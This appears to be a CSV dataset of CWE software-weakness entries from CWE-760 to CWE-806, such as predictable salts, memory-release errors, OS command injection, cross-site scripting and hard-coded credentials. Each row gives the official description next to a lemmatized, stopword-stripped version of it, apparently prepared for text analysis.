CWE-760,Use of a One-Way Hash with a Predictable Salt,"The product uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the product uses a predictable salt as part of the input.This makes it easier for attackers to pre-compute the hash value using dictionary attack techniques such as rainbow tables, effectively disabling the protection that an unpredictable salt would provide.It should be noted that, despite common perceptions, the use of a good salt with a hash does not sufficiently increase the effort for an attacker who is targeting an individual password, or who has a large amount of computing resources available, such as with cloud-based services or specialized, inexpensive hardware. Offline password cracking can still be effective if the hash function is not expensive to compute; many cryptographic functions are designed to be efficient and can be vulnerable to attacks using massive computing resources, even if the hash is cryptographically strong. The use of a salt only slightly increases the computing requirements for an attacker compared to other strategies such as adaptive hash functions. See CWE-916 for more details.",product use way cryptographic hash input reversible password product use predictable salt input make easy attacker pre compute hash value dictionary attack technique rainbow table effectively disable protection unpredictable salt provide note despite common perception use good salt hash sufficiently increase effort attacker target individual password large compute resource available cloud base service specialized inexpensive hardware offline password cracking effective hash function expensive compute cryptographic function design efficient vulnerable attack massive compute resource hash cryptographically strong use salt slightly increase computing requirement attacker compare strategy adaptive hash function detail
CWE-761,Free of Pointer not at Start of Buffer,"The product calls free() on a pointer to a memory resource that was allocated on the heap, but the pointer is not at the start of the buffer.This can cause the product to crash, or in some cases, modify critical program variables or execute code.This weakness often occurs when the memory is allocated explicitly on the heap with one of the malloc() family functions and free() is called, but pointer arithmetic has caused the pointer to be in the interior or end of the buffer.",product call free pointer memory resource allocate heap pointer start buffer cause product crash case modify critical program variable execute code weakness occur memory allocate explicitly heap malloc family function free call pointer arithmetic cause pointer interior end buffer
CWE-762,Mismatched Memory Management Routines,"The product attempts to return a memory resource to the system, but it calls a release function that is not compatible with the function that was originally used to allocate that resource.This weakness can be generally described as mismatching memory management routines, such as:The memory was allocated on the stack (automatically), but it was deallocated using the memory management routine free() (CWE-590), which is intended for explicitly allocated heap memory.The memory was allocated explicitly using one set of memory management functions, and deallocated using a different set. For example, memory might be allocated with malloc() in C++ instead of the new operator, and then deallocated with the delete operator.When the memory management functions are mismatched, the consequences may be as severe as code execution, memory corruption, or program crash. Consequences and ease of exploit will vary depending on the implementation of the routines and the object being managed.",product attempt return memory resource system call release function compatible function originally allocate resource weakness generally describe mismatch memory management routine memory allocate stack automatically deallocate memory management routine free intend explicitly allocate heap memory memory allocate explicitly set memory management function deallocate different set example memory allocate malloc instead new operator deallocate delete operator memory management function mismatched consequence severe code execution memory corruption program crash consequence ease exploit vary depend implementation routine object manage
CWE-763,Release of Invalid Pointer or Reference,"The product attempts to return a memory resource to the system, but it calls the wrong release function or calls the appropriate release function incorrectly.This weakness can take several forms, such as:The memory was allocated, explicitly or implicitly, via one memory management method and deallocated using a different, non-compatible function (CWE-762).The function calls or memory management routines chosen are appropriate, however they are used incorrectly, such as in CWE-761.",product attempt return memory resource system call wrong release function call appropriate release function incorrectly weakness form memory allocate explicitly implicitly memory management method deallocate different non compatible function function call memory management routine choose appropriate incorrectly
CWE-764,Multiple Locks of a Critical Resource,"The product locks a critical resource more times than intended, leading to an unexpected state in the system.When a product is operating in a concurrent environment and repeatedly locks a critical resource, the consequences will vary based on the type of lock, the lock's implementation, and the resource being protected. In some situations such as with semaphores, the resources are pooled and extra locking calls will reduce the size of the total available pool, possibly leading to degraded performance or a denial of service. If this can be triggered by an attacker, it will be similar to an unrestricted lock (CWE-412). In the context of a binary lock, it is likely that any duplicate locking attempts will never succeed since the lock is already held and progress may not be possible.",product lock critical resource time intend lead unexpected state system product operate concurrent environment repeatedly lock critical resource consequence vary base type lock lock implementation resource protect situation semaphore resource pool extra locking call reduce size total available pool possibly lead degraded performance denial service trigger attacker similar unrestricted lock context binary lock likely duplicate locking attempt succeed lock hold progress possible
CWE-765,Multiple Unlocks of a Critical Resource,"The product unlocks a critical resource more times than intended, leading to an unexpected state in the system.When the product is operating in a concurrent environment and repeatedly unlocks a critical resource, the consequences will vary based on the type of lock, the lock's implementation, and the resource being protected. In some situations such as with semaphores, the resources are pooled and extra calls to unlock will increase the count for the number of available resources, likely resulting in a crash or unpredictable behavior when the system nears capacity.",product unlock critical resource time intend lead unexpected state system product operate concurrent environment repeatedly unlock critical resource consequence vary base type lock lock implementation resource protect situation semaphore resource pool extra call unlock increase count number available resource likely result crash unpredictable behavior system near capacity
CWE-766,Critical Data Element Declared Public,"The product declares a critical variable, field, or member to be public when intended security policy requires it to be private.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",product declare critical variable field member public intended security policy require private issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-767,Access to Critical Private Variable via Public Method,"The product defines a public method that reads or modifies a private variable.If an attacker modifies the variable to contain unexpected values, this could violate assumptions from other parts of the code. Additionally, if an attacker can read the private variable, it may expose sensitive information or make it easier to launch further attacks.",product define public method read modify private variable attacker modify variable contain unexpected value violate assumption part code additionally attacker read private variable expose sensitive information easy launch attack
CWE-768,Incorrect Short Circuit Evaluation,"The product contains a conditional statement with multiple logical expressions in which one of the non-leading expressions may produce side effects. This may lead to an unexpected state in the program after the execution of the conditional, because short-circuiting logic may prevent the side effects from occurring.Usage of short circuit evaluation, though well-defined in the C standard, may alter control flow in a way that introduces logic errors that are difficult to detect, possibly causing errors later during the product's execution. If an attacker can discover such an inconsistency, it may be exploitable to gain arbitrary control over a system.If the first condition of an ""or"" statement is assumed to be true under normal circumstances, or if the first condition of an ""and"" statement is assumed to be false, then any subsequent conditional may contain its own logic errors that are not detected during code review or testing.Finally, the usage of short circuit evaluation may decrease the maintainability of the code.",product contain conditional statement multiple logical expression non leading expression produce effect lead unexpected state program execution conditional short circuit logic prevent effect occur usage short circuit evaluation define c standard alter control flow way introduce logic error difficult detect possibly cause error later product execution attacker discover inconsistency exploitable gain arbitrary control system condition statement assume true normal circumstance condition statement assume false subsequent conditional contain logic error detect code review testing finally usage short circuit evaluation decrease maintainability code
CWE-769,DEPRECATED: Uncontrolled File Descriptor Consumption,This entry has been deprecated because it was a duplicate of CWE-774. All content has been transferred to CWE-774.,entry deprecate duplicate content transfer
CWE-77,Improper Neutralization of Special Elements used in a Command ('Command Injection'),"The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component.Command injection vulnerabilities typically occur when:1. Data enters the application from an untrusted source.2. The data is part of a string that is executed as a command by the application.3. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.Many protocols and products have their own custom command language. While OS or shell command strings are frequently discovered and targeted, developers may not realize that these other command languages might also be vulnerable to attacks.Command injection is a common problem with wrapper programs.",product construct command externally influence input upstream component neutralize incorrectly neutralize special element modify intended command send downstream component command injection vulnerability typically occur data enter application untrusted data string execute command execute command application give attacker privilege capability attacker protocol product custom command language os shell command string frequently discover target developer realize command language vulnerable attack command injection common problem wrapper program
CWE-770,Allocation of Resources Without Limits or Throttling,"The product allocates a reusable resource or group of resources on behalf of an actor without imposing any restrictions on the size or number of resources that can be allocated, in violation of the intended security policy for that actor.Code frequently has to work with limited resources, so programmers must be careful to ensure that resources are not consumed too quickly, or too easily. Without use of quotas, resource limits, or other protection mechanisms, it can be easy for an attacker to consume many resources by rapidly making many requests, or causing larger resources to be used than is needed. When too many resources are allocated, or if a single resource is too large, then it can prevent the code from working correctly, possibly leading to a denial of service.",product allocate reusable resource group resource behalf actor impose restriction size number resource allocate violation intended security policy actor code frequently work limited resource programmer careful ensure resource consume quickly easily use quota resource limit protection mechanism easy attacker consume resource rapidly make request cause large resource need resource allocate single resource large prevent code work correctly possibly lead denial service
CWE-771,Missing Reference to Active Allocated Resource,"The product does not properly maintain a reference to a resource that has been allocated, which prevents the resource from being reclaimed.This does not necessarily apply in languages or frameworks that automatically perform garbage collection, since the removal of all references may act as a signal that the resource is ready to be reclaimed.",product properly maintain reference resource allocate prevent resource reclaim necessarily apply language framework automatically perform garbage collection removal reference act signal resource ready reclaim
CWE-772,Missing Release of Resource after Effective Lifetime,"The product does not release a resource after its effective lifetime has ended, i.e., after the resource is no longer needed.When a resource is not released after use, it can allow attackers to cause a denial of service by causing the allocation of resources without triggering their release. Frequently-affected resources include memory, CPU, disk space, power or battery, etc.",product release resource effective lifetime end resource long need resource release use allow attacker cause denial service cause allocation resource trigger release frequently affect resource include memory cpu disk space power battery etc
CWE-773,Missing Reference to Active File Descriptor or Handle,"The product does not properly maintain references to a file descriptor or handle, which prevents that file descriptor/handle from being reclaimed.This can cause the product to consume all available file descriptors or handles, which can prevent other processes from performing critical file processing operations.",product properly maintain reference file descriptor handle prevent file descriptor handle reclaim cause product consume available file descriptor handle prevent process perform critical file processing operation
CWE-774,Allocation of File Descriptors or Handles Without Limits or Throttling,"The product allocates file descriptors or handles on behalf of an actor without imposing any restrictions on how many descriptors can be allocated, in violation of the intended security policy for that actor.This can cause the product to consume all available file descriptors or handles, which can prevent other processes from performing critical file processing operations.",product allocate file descriptor handle behalf actor impose restriction descriptor allocate violation intended security policy actor cause product consume available file descriptor handle prevent process perform critical file processing operation
CWE-775,Missing Release of File Descriptor or Handle after Effective Lifetime,"The product does not release a file descriptor or handle after its effective lifetime has ended, i.e., after the file descriptor/handle is no longer needed.When a file descriptor or handle is not released after use (typically by explicitly closing it), attackers can cause a denial of service by consuming all available file descriptors/handles, or otherwise preventing other system processes from obtaining their own file descriptors/handles.",product release file descriptor handle effective lifetime end file descriptor handle long need file descriptor handle release use typically explicitly close attacker cause denial service consume available file descriptor handle prevent system process obtain file descriptor handle
CWE-776,Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion'),"The product uses XML documents and allows their structure to be defined with a Document Type Definition (DTD), but it does not properly control the number of recursive definitions of entities.If the DTD contains a large number of nested or recursive entities, this can lead to explosive growth of data when parsed, causing a denial of service.",product use xml document allow structure define document type definition dtd properly control number recursive definition entity dtd contain large number nested recursive entity lead explosive growth datum parse cause denial service
CWE-777,Regular Expression without Anchors,"The product uses a regular expression to perform neutralization, but the regular expression is not anchored and may allow malicious or malformed data to slip through.When performing tasks such as validating against a set of allowed inputs (allowlist), data is examined and possibly modified to ensure that it is well-formed and adheres to a list of safe values. If the regular expression is not anchored, malicious or malformed data may be included before or after any string matching the regular expression. The type of malicious data that is allowed will depend on the context of the application and which anchors are omitted from the regular expression.",product use regular expression perform neutralization regular expression anchor allow malicious malformed datum slip perform task validate set allow input allowlist data examine possibly modify ensure form adhere list safe value regular expression anchor malicious malformed datum include string match regular expression type malicious datum allow depend context application anchor omit regular expression
CWE-778,Insufficient Logging,"When a security-critical event occurs, the product either does not record the event or omits important details about the event when logging it.When security-critical events are not logged properly, such as a failed login attempt, this can make malicious behavior more difficult to detect and may hinder forensic analysis after an attack succeeds.As organizations adopt cloud storage resources, these technologies often require configuration changes to enable detailed logging information, since detailed logging can incur additional costs. This could lead to telemetry gaps in critical audit logs. For example, in Azure, the default value for logging is disabled.",security critical event occur product record event omit important detail event log security critical event log properly fail login attempt malicious behavior difficult detect hinder forensic analysis attack succeed organization adopt cloud storage resource technology require configuration change enable detailed logging information detailed logging incur additional cost lead telemetry gap critical audit log example azure default value logging disable
CWE-779,Logging of Excessive Data,"The product logs too much information, making log files hard to process and possibly hindering recovery efforts or forensic analysis after an attack.While logging is a good practice in general, and very high levels of logging are appropriate for debugging stages of development, too much logging in a production environment might hinder a system administrator's ability to detect anomalous conditions. This can provide cover for an attacker while attempting to penetrate a system, clutter the audit trail for forensic analysis, or make it more difficult to debug problems in a production environment.",product log information make log file hard process possibly hinder recovery effort forensic analysis attack logging good practice general high level logging appropriate debug stage development logging production environment hinder system administrator ability detect anomalous condition provide cover attacker attempt penetrate system clutter audit trail forensic analysis difficult debug problem production environment
CWE-78,Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection'),"The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.This could allow attackers to execute unexpected, dangerous commands directly on the operating system. This weakness can lead to a vulnerability in environments in which the attacker does not have direct access to the operating system, such as in web applications. Alternately, if the weakness occurs in a privileged program, it could allow the attacker to specify commands that normally would not be accessible, or to call alternate commands with privileges that the attacker does not have. The problem is exacerbated if the compromised process does not follow the principle of least privilege, because the attacker-controlled commands may run with special system privileges that increases the amount of damage.There are at least two subtypes of OS command injection:The application intends to execute a single, fixed program that is under its own control. It intends to use externally-supplied inputs as arguments to that program. For example, the program might use system(""nslookup [HOSTNAME]"") to run nslookup and allow the user to supply a HOSTNAME, which is used as an argument. Attackers cannot prevent nslookup from executing. However, if the program does not remove command separators from the HOSTNAME argument, attackers could place the separators into the arguments, which allows them to execute their own program after nslookup has finished executing.The application accepts an input that it uses to fully select which program to run, as well as which commands to use. The application simply redirects this entire command to the operating system. For example, the program might use ""exec([COMMAND])"" to execute the [COMMAND] that was supplied by the user. If the COMMAND is under attacker control, then the attacker can execute arbitrary commands or programs. If the command is being executed using functions like exec() and CreateProcess(), the attacker might not be able to combine multiple commands together in the same line.From a weakness standpoint, these variants represent distinct programmer errors. In the first variant, the programmer clearly intends that input from untrusted parties will be part of the arguments in the command to be executed. In the second variant, the programmer does not intend for the command to be accessible to any untrusted party, but the programmer probably has not accounted for alternate ways in which malicious attackers can provide input.",product construct os command externally influence input upstream component neutralize incorrectly neutralize special element modify intended os command send downstream component allow attacker execute unexpected dangerous command directly operate system weakness lead vulnerability environment attacker direct access operate system web application alternately weakness occur privileged program allow attacker specify command normally accessible alternate command privilege attacker problem exacerbate compromise process follow principle privilege attacker control command run special system privilege increase damage subtype os command injection application intend execute single fixed program control intend use externally supply input argument program example program use hostname run nslookup allow user supply hostname argument attacker prevent nslookup execute program remove command separator hostname argument attacker place separator argument allow execute program nslookup finish execute application accept input use fully select program run command use application simply redirect entire command operate system example program use execute command supply user command attacker control attacker execute arbitrary command program command execute function like exec createprocess attacker able combine multiple command line weakness standpoint variant represent distinct programmer error variant programmer clearly intend input untrusted party argument command execute second variant programmer intend command accessible untrusted party programmer probably account alternate way malicious attacker provide input
CWE-780,Use of RSA Algorithm without OAEP,"The product uses the RSA algorithm but does not incorporate Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.Padding schemes are often used with cryptographic algorithms to make the plaintext less predictable and complicate attack efforts. The OAEP scheme is often used with RSA to nullify the impact of predictable common text.",product use rsa algorithm incorporate optimal asymmetric encryption padding oaep weaken encryption padding scheme cryptographic algorithm plaintext predictable complicate attack effort oaep scheme rsa nullify impact predictable common text
CWE-781,Improper Address Validation in IOCTL with METHOD_NEITHER I/O Control Code,"The product defines an IOCTL that uses METHOD_NEITHER for I/O, but it does not validate or incorrectly validates the addresses that are provided.When an IOCTL uses the METHOD_NEITHER option for I/O control, it is the responsibility of the IOCTL to validate the addresses that have been supplied to it. If validation is missing or incorrect, attackers can supply arbitrary memory addresses, leading to code execution or a denial of service.",product define ioctl use o validate incorrectly validate address provide ioctl use option o control responsibility ioctl validate address supply validation missing incorrect attacker supply arbitrary memory address lead code execution denial service
CWE-782,Exposed IOCTL with Insufficient Access Control,"The product implements an IOCTL with functionality that should be restricted, but it does not properly enforce access control for the IOCTL.When an IOCTL contains privileged functionality and is exposed unnecessarily, attackers may be able to access this functionality by invoking the IOCTL. Even if the functionality is benign, if the programmer has assumed that the IOCTL would only be accessed by a trusted process, there may be little or no validation of the incoming data, exposing weaknesses that would never be reachable if the attacker cannot call the IOCTL directly.The implementations of IOCTLs will differ between operating system types and versions, so the methods of attack and prevention may vary widely.",product implement ioctl functionality restrict properly enforce access control ioctl contain privileged functionality expose unnecessarily attacker able access functionality invoke ioctl functionality benign programmer assume ioctl access trust process little validation incoming datum expose weakness reachable attacker ioctl directly implementation ioctls differ operate system type version method attack prevention vary widely
CWE-783,Operator Precedence Logic Error,"The product uses an expression in which operator precedence causes incorrect logic to be used.While often just a bug, operator precedence logic errors can have serious consequences if they are used in security-critical code, such as making an authentication decision.",product use expression operator precedence cause incorrect logic bug operator precedence logic error consequence security critical code make authentication decision
CWE-784,Reliance on Cookies without Validation and Integrity Checking in a Security Decision,"The product uses a protection mechanism that relies on the existence or values of a cookie, but it does not properly ensure that the cookie is valid for the associated user.Attackers can easily modify cookies, within the browser or by implementing the client-side code outside of the browser. Attackers can bypass protection mechanisms such as authorization and authentication by modifying the cookie to contain an expected value.",product use protection mechanism rely existence value cookie properly ensure cookie valid associate user attacker easily modify cookie browser implement client code outside browser attacker bypass protection mechanism authorization authentication modify cookie contain expect value
CWE-785,Use of Path Manipulation Function without Maximum-sized Buffer,"The product invokes a function for normalizing paths or file names, but it provides an output buffer that is smaller than the maximum possible size, such as PATH_MAX.Passing an inadequately-sized output buffer to a path manipulation function can result in a buffer overflow. Such functions include realpath(), readlink(), PathAppend(), and others.",product invoke function normalize path file name provide output buffer small maximum possible size inadequately size output buffer path manipulation function result buffer overflow function include realpath readlink pathappend
CWE-786,Access of Memory Location Before Start of Buffer,"The product reads or writes to a buffer using an index or pointer that references a memory location prior to the beginning of the buffer.This typically occurs when a pointer or its index is decremented to a position before the buffer, when pointer arithmetic results in a position before the beginning of the valid memory location, or when a negative index is used.",product read write buffer index pointer reference memory location prior beginning buffer typically occur pointer index decremente position buffer pointer arithmetic result position beginning valid memory location negative index
CWE-787,Out-of-bounds Write,"The product writes data past the end, or before the beginning, of the intended buffer.Typically, this can result in corruption of data, a crash, or code execution. The product may modify an index or perform pointer arithmetic that references a memory location that is outside of the boundaries of the buffer. A subsequent write operation then produces undefined or unexpected results.",product write datum past end beginning intended buffer typically result corruption datum crash code execution product modify index perform pointer arithmetic reference memory location outside boundary buffer subsequent write operation produce undefined unexpected result
CWE-788,Access of Memory Location After End of Buffer,The product reads or writes to a buffer using an index or pointer that references a memory location after the end of the buffer.This typically occurs when a pointer or its index is incremented to a position after the buffer; or when pointer arithmetic results in a position after the buffer.,product read write buffer index pointer reference memory location end buffer typically occur pointer index incremente position buffer pointer arithmetic result position buffer
CWE-789,Memory Allocation with Excessive Size Value,"The product allocates memory based on an untrusted, large size value, but it does not ensure that the size is within expected limits, allowing arbitrary amounts of memory to be allocated.",product allocate memory base untrusted large size value ensure size expected limit allow arbitrary amount memory allocate
CWE-79,Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'),"The product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.Cross-site scripting (XSS) vulnerabilities occur when:Untrusted data enters a web application, typically from a web request.The web application dynamically generates a web page that contains this untrusted data.During page generation, the application does not prevent the data from containing content that is executable by a web browser, such as JavaScript, HTML tags, HTML attributes, mouse events, Flash, ActiveX, etc.A victim visits the generated web page through a web browser, which contains malicious script that was injected using the untrusted data.Since the script comes from a web page that was sent by the web server, the victim's web browser executes the malicious script in the context of the web server's domain.This effectively violates the intention of the web browser's same-origin policy, which states that scripts in one domain should not be able to access resources or run code in a different domain.There are three main kinds of XSS:Type 1: Reflected XSS (or Non-Persistent) - The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.Type 2: Stored XSS (or Persistent) - The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs. Type 0: DOM-Based XSS - In DOM-based XSS, the client performs the injection of XSS into the page; in the other types, the server performs the injection. DOM-based XSS generally involves server-controlled, trusted script that is sent to the client, such as Javascript that performs sanity checks on a form before the user submits it. If the server-supplied script processes user-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible. Once the malicious script is injected, the attacker can perform a variety of malicious activities. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site. Finally, the script could exploit a vulnerability in the web browser itself possibly taking over the victim's machine, sometimes referred to as ""drive-by hacking.""In many cases, the attack can be launched without the victim even being aware of it. Even with careful users, attackers frequently use a variety of methods to encode the malicious portion of the attack, such as URL encoding or Unicode, so the request looks less suspicious.",product neutralize incorrectly neutralize user controllable input place output web page serve user cross site scripting xss vulnerability occur untrusted data enter web application typically web request web application dynamically generate web page contain untrusted data page generation application prevent datum contain content executable web browser javascript html tag html attribute mouse event flash activex etc victim visit generate web page web browser contain malicious script inject untrusted datum script come web page send web server victim web browser execute malicious script context web server domain effectively violate intention web browser origin policy state script domain able access resource run code different domain main kind xss type reflect xss non persistent server read datum directly http request reflect http response reflect xss exploit occur attacker cause victim supply dangerous content vulnerable web application reflect victim execute web browser common mechanism deliver malicious content include parameter url post publicly e mail directly victim url construct manner constitute core phishing scheme attacker convince victim visit url refer vulnerable site site reflect attacker content victim content execute victim browser type store xss persistent application store dangerous datum database message forum visitor log trusted datum store later time dangerous data subsequently read application include dynamic content attacker perspective optimal place inject malicious content area display user particularly interesting user interesting user typically elevated privilege application interact sensitive datum valuable attacker user execute malicious content attacker able perform privileged operation behalf user gain access sensitive datum belong user example attacker inject xss log message handle properly administrator view log type dom base xss dom base xss client perform injection xss page type server perform injection dom base xss generally involve server control trusted script send client javascript perform sanity check form user submit server supply script process user supply datum inject web page dynamic html dom base xss possible malicious script inject attacker perform variety malicious activity attacker transfer private information cookie include session information victim machine attacker attacker send malicious request web site behalf victim especially dangerous site victim administrator privilege manage site phishing attack emulate trusted web site trick victim enter password allow attacker compromise victim account web site finally script exploit vulnerability web browser possibly take victim machine refer drive hacking case attack launch victim aware careful user attacker frequently use variety method encode malicious portion attack url encoding unicode request look suspicious
CWE-790,Improper Filtering of Special Elements,"The product receives data from an upstream component, but does not filter or incorrectly filters special elements before sending it to a downstream component.",product receive datum upstream component filter incorrectly filter special element send downstream component
CWE-791,Incomplete Filtering of Special Elements,"The product receives data from an upstream component, but does not completely filter special elements before sending it to a downstream component.",product receive datum upstream component completely filter special element send downstream component
CWE-792,Incomplete Filtering of One or More Instances of Special Elements,"The product receives data from an upstream component, but does not completely filter one or more instances of special elements before sending it to a downstream component.Incomplete filtering of this nature involves either:only filtering a single instance of a special element when more exist, ornot filtering all instances or all elements where multiple special elements exist.",product receive datum upstream component completely filter instance special element send downstream component incomplete filtering nature involve filter single instance special element exist ornot filter instance element multiple special element exist
CWE-793,Only Filtering One Instance of a Special Element,"The product receives data from an upstream component, but only filters a single instance of a special element before sending it to a downstream component.Incomplete filtering of this nature may be location-dependent, as in only the first or last element is filtered.",product receive datum upstream component filter single instance special element send downstream component incomplete filtering nature location dependent element filter
CWE-794,Incomplete Filtering of Multiple Instances of Special Elements,"The product receives data from an upstream component, but does not filter all instances of a special element before sending it to a downstream component.Incomplete filtering of this nature may be applied to:sequential elements (special elements that appear next to each other) ornon-sequential elements (special elements that appear multiple times in different locations).",product receive datum upstream component filter instance special element send downstream component incomplete filtering nature apply sequential element special element appear ornon sequential element special element appear multiple time different location
CWE-795,Only Filtering Special Elements at a Specified Location,"The product receives data from an upstream component, but only accounts for special elements at a specified location, thereby missing remaining special elements that may exist before sending it to a downstream component.A filter might only account for instances of special elements when they occur:relative to a marker (e.g. ""at the beginning/end of string; the second argument""), orat an absolute position (e.g. ""byte number 10"").This may leave special elements in the data that did not match the filter position, but still may be dangerous.",product receive datum upstream component account special element specify location miss remain special element exist send downstream component filter account instance special element occur relative marker beginning end string second argument orat absolute position byte number leave special element datum match filter position dangerous
CWE-796,Only Filtering Special Elements Relative to a Marker,"The product receives data from an upstream component, but only accounts for special elements positioned relative to a marker (e.g. ""at the beginning/end of a string; the second argument""), thereby missing remaining special elements that may exist before sending it to a downstream component.",product receive datum upstream component account special element position relative marker beginning end string second argument miss remain special element exist send downstream component
CWE-797,Only Filtering Special Elements at an Absolute Position,"The product receives data from an upstream component, but only accounts for special elements at an absolute position (e.g. ""byte number 10""), thereby missing remaining special elements that may exist before sending it to a downstream component.",product receive datum upstream component account special element absolute position byte number miss remain special element exist send downstream component
CWE-798,Use of Hard-coded Credentials,"The product contains hard-coded credentials, such as a password or cryptographic key, which it uses for its own inbound authentication, outbound communication to external components, or encryption of internal data.Hard-coded credentials typically create a significant hole that allows an attacker to bypass the authentication that has been configured by the product administrator. This hole might be difficult for the system administrator to detect. Even if detected, it can be difficult to fix, so the administrator may be forced into disabling the product entirely. There are two main variations:Inbound: the product contains an authentication mechanism that checks the input credentials against a hard-coded set of credentials.Outbound: the product connects to another system or component, and it contains hard-coded credentials for connecting to that component.In the Inbound variant, a default administration account is created, and a simple password is hard-coded into the product and associated with that account. This hard-coded password is the same for each installation of the product, and it usually cannot be changed or disabled by system administrators without manually modifying the program, or otherwise patching the product. If the password is ever discovered or published (a common occurrence on the Internet), then anybody with knowledge of this password can access the product. Finally, since all installations of the product will have the same password, even across different organizations, this enables massive attacks such as worms to take place.The Outbound variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password which can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end product. Any user of that program may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat, since the extraction of a password from a binary is usually very simple.",product contain hard code credential password cryptographic key use inbound authentication outbound communication external component encryption internal datum hard code credential typically create significant hole allow attacker bypass authentication configure product administrator hole difficult system administrator detect detect difficult fix administrator force disable product entirely main variation inbound product contain authentication mechanism check input credential hard code set credential outbound product connect system component contain hard code credential connect component inbound variant default administration account create simple password hard code product associate account hard code password installation product usually change disable system administrator manually modify program patch product password discover publish common occurrence internet anybody knowledge password access product finally installation product password different organization enable massive attack worm place outbound variant apply end system authenticate end service end service require fix password easily discover programmer simply hard code end credential end product user program able extract password client system hard code password pose threat extraction password binary usually simple
CWE-799,Improper Control of Interaction Frequency,"The product does not properly limit the number or frequency of interactions that it has with an actor, such as the number of incoming requests.This can allow the actor to perform actions more frequently than expected. The actor could be a human or an automated process such as a virus or bot. This could be used to cause a denial of service, compromise program logic (such as limiting humans to a single vote), or other consequences. For example, an authentication routine might not limit the number of times an attacker can guess a password. Or, a web site might conduct a poll but only expect humans to vote a maximum of once a day.",product properly limit number frequency interaction actor number incoming request allow actor perform action frequently expect actor human automated process virus bot cause denial service compromise program logic limit human single vote consequence example authentication routine limit number time attacker guess password web site conduct poll expect human vote maximum day
CWE-8,J2EE Misconfiguration: Entity Bean Declared Remote,"When an application exposes a remote interface for an entity bean, it might also expose methods that get or set the bean's data. These methods could be leveraged to read sensitive information, or to change data in ways that violate the application's expectations, potentially leading to other vulnerabilities.",application expose remote interface entity bean expose method set bean datum method leveraged read sensitive information change datum way violate application expectation potentially lead vulnerability
CWE-80,Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS),"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special characters such as ""<"", "">"", and ""&"" that could be interpreted as web-scripting elements when they are sent to a downstream component that processes web pages.This may allow such characters to be treated as control characters, which are executed client-side in the context of the user's session. Although this can be classified as an injection problem, the more pertinent issue is the improper conversion of such special characters to respective context-appropriate entities before displaying them to the user.",product receive input upstream component neutralize incorrectly neutralize special character interpret web scripting element send downstream component process web page allow character treat control character execute client context user session classify injection problem pertinent issue improper conversion special character respective context appropriate entity display user
CWE-804,Guessable CAPTCHA,"The product uses a CAPTCHA challenge, but the challenge can be guessed or automatically recognized by a non-human actor.An automated attacker could bypass the intended protection of the CAPTCHA challenge and perform actions at a higher frequency than humanly possible, such as launching spam attacks.There can be several different causes of a guessable CAPTCHA:An audio or visual image that does not have sufficient distortion from the unobfuscated source image.A question is generated with a format that can be automatically recognized, such as a math question.A question for which the number of possible answers is limited, such as birth years or favorite sports teams.A general-knowledge or trivia question for which the answer can be accessed using a data base, such as country capitals or popular entertainers.Other data associated with the CAPTCHA may provide hints about its contents, such as an image whose filename contains the word that is used in the CAPTCHA.",product use captcha challenge challenge guess automatically recognize non human actor automate attacker bypass intended protection captcha challenge perform action high frequency humanly possible launch spam attack different cause guessable captcha audio visual image sufficient distortion unobfuscated source image question generate format automatically recognize math question question number possible answer limit birth year favorite sport team general knowledge trivia question answer access data base country capital popular entertainer datum associate captcha provide hint content image filename contain word captcha
CWE-805,Buffer Access with Incorrect Length Value,"The product uses a sequential operation to read or write a buffer, but it uses an incorrect length value that causes it to access memory that is outside of the bounds of the buffer.When the length value exceeds the size of the destination, a buffer overflow could occur.",product use sequential operation read write buffer use incorrect length value cause access memory outside bound buffer length value exceed size destination buffer overflow occur
CWE-806,Buffer Access Using Size of Source Buffer,"The product uses the size of a source buffer when reading from or writing to a destination buffer, which may cause it to access memory that is outside of the bounds of the buffer.When the size of the destination is smaller than the size of the source, a buffer overflow could occur.",product use size source buffer read write destination buffer cause access memory outside bound buffer size destination small size source buffer overflow occur
